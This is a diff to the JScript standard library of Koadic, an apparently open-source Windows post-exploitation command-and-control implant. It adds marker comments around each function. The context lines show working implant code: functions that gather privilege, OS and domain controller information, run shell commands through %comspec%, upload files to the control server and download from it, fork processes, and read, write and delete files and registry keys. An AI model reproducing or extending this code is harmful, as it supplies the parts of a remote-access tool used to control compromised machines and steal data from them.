@@ -126,6 +126,7 @@ Koadic.uuid = function()
 
 Koadic.user = {};
 
+//user.isElevated.start
 Koadic.user.isElevated = function()
 {
     try
@@ -138,7 +139,8 @@ Koadic.user.isElevated = function()
         return false;
     }
 }
-
+//user.isElevated.end
+//user.OS.start
 Koadic.user.OS = function()
 {
     try
@@ -155,7 +157,8 @@ Koadic.user.OS = function()
 
     return "Unknown";
 }
-
+//user.OS.end
+//user.DC.start
 Koadic.user.DC = function()
 {
     try
@@ -174,6 +177,7 @@ Koadic.user.DC = function()
     return "Unknown";
 
 }
+//user.DC.end
 
 /*Koadic.user.ParseDomainAdmins = function(results)
 {
@@ -201,7 +205,7 @@ Koadic.user.DC = function()
     }
     return retstring;
 }*/
-
+//user.Arch.start
 Koadic.user.Arch = function()
 {
     try
@@ -218,7 +222,8 @@ Koadic.user.Arch = function()
 
     return "Unknown";
 }
-
+//user.Arch.end
+//user.CWD.start
 Koadic.user.CWD = function()
 {
     try
@@ -231,7 +236,8 @@ Koadic.user.CWD = function()
 
     return "";
 }
-
+//user.CWD.end
+//user.IPAddrs.start
 /*
 Koadic.user.IPAddrs = function()
 {
@@ -279,7 +285,8 @@ Koadic.user.IPAddrs = function()
 
     return "";
 }
-
+//user.IPAddrs.end
+//user.info.start
 Koadic.user.info = function()
 {
     var net = new ActiveXObject("WScript.Network");
@@ -297,6 +304,7 @@ Koadic.user.info = function()
 
     return info;
 }
+//user.info.end
 
 Koadic.work = {};
 
@@ -379,6 +387,7 @@ Koadic.work.get = function()
  *
  * @return void
 */
+//work.fork.start
 Koadic.work.fork = function(jobkey, fork32Bit)
 {
     var fork32Bit = (typeof(fork32Bit) !== "undefined") ? fork32Bit : false;
@@ -395,7 +404,7 @@ Koadic.work.fork = function(jobkey, fork32Bit)
         Koadic.WS.Run(cmd, 0, false);
     }
 }
-
+//work.fork.end
 Koadic.http = {};
 
 Koadic.http.create = function()
@@ -468,6 +477,7 @@ Koadic.http.get = function(url, headers)
  * @return object - the HTTP object
  *
 **/
+//http.upload.start
 Koadic.http.upload = function(filepath, header_uuid, header_key)
 {
     var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";
@@ -483,7 +493,8 @@ Koadic.http.upload = function(filepath, header_uuid, header_key)
 
     return Koadic.work.report(data, headers);
 }
-
+//http.upload.end
+//http.download.start
 Koadic.http.download = function(filepath, header_uuid, header_key)
 {
     var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";
@@ -493,7 +504,8 @@ Koadic.http.download = function(filepath, header_uuid, header_key)
 
     return Koadic.http.downloadEx("POST", Koadic.work.make_url(), headers, filepath);
 }
-
+//http.download.end
+//http.downloadEx.start
 Koadic.http.downloadEx = function(verb, url, headers, path)
 {
     if (verb == "GET")
@@ -514,7 +526,8 @@ Koadic.http.downloadEx = function(verb, url, headers, path)
     var data = Koadic.http.bin2str(stream);
     Koadic.file.write(path, data);
 }
-
+//http.downloadEx.end
+//http.bin2str.start
 Koadic.http.bin2str = function(stream)
 {
     stream.Flush();
@@ -532,7 +545,7 @@ Koadic.http.bin2str = function(stream)
     rs.Close();
     return data.substring(0, data.length - 1);
 }
-
+//http.bin2str.end
 Koadic.process = {};
 
 Koadic.process.currentPID = function()
@@ -623,6 +636,7 @@ Koadic.process.list = function()
 }
 
 // http://apidock.com/ruby/Win32/Registry/Constants
+//registry.start
 Koadic.registry = {};
 Koadic.registry.HKCR = 0x80000000;
 Koadic.registry.HKCU = 0x80000001;
@@ -732,6 +746,7 @@ Koadic.registry.create = function(hiveKey, path, key, computer)
     return createRet.returnValue == 0;
 }
 */
+//registry.end
 
 Koadic.WMI = {};
 
@@ -761,7 +776,7 @@ Koadic.WMI.createProcess = function(cmd)
 }
 
 Koadic.shell = {};
-
+//shell.exec.start
 Koadic.shell.exec = function(cmd, stdOutPath)
 {
     var c = "%comspec% /q /c " + cmd + " 1> " + Koadic.file.getPath(stdOutPath);
@@ -772,13 +787,15 @@ Koadic.shell.exec = function(cmd, stdOutPath)
 
     return data;
 }
-
+//shell.exec.end
+//shell.run.start
 Koadic.shell.run = function(cmd, fork)
 {
     var fork = (typeof(fork) !== "undefined") ? fork : true;
     var c = "%comspec% /q /c " + cmd;
     Koadic.WS.Run(cmd, 0, !fork);
 }
+//shell.run.end
 
 Koadic.file = {};
 
@@ -800,7 +817,7 @@ Koadic.file.get32BitFolder = function()
 
     return base + "\\System32\\";
 }
-
+//file.readText.start
 Koadic.file.readText = function(path)
 {
 
@@ -825,7 +842,8 @@ Koadic.file.readText = function(path)
         }
     }
 }
-
+//file.readText.end
+//file.readBinary.start
 Koadic.file.readBinary = function(path)
 {
     var fp = Koadic.FS.GetFile(Koadic.file.getPath(path));
@@ -834,15 +852,19 @@ Koadic.file.readBinary = function(path)
     fd.close();
     return data;
 }
-
+//file.readBinary.end
+//file.write.start
 Koadic.file.write = function(path, data)
 {
     var fd = Koadic.FS.CreateTextFile(Koadic.file.getPath(path), true);
     fd.write(data);
     fd.close();
 }
-
+//file.write.end
+//file.deleteFile.start
 Koadic.file.deleteFile = function(path)
 {
     Koadic.FS.DeleteFile(Koadic.file.getPath(path), true);
 };
+//file.deleteFile.end
+
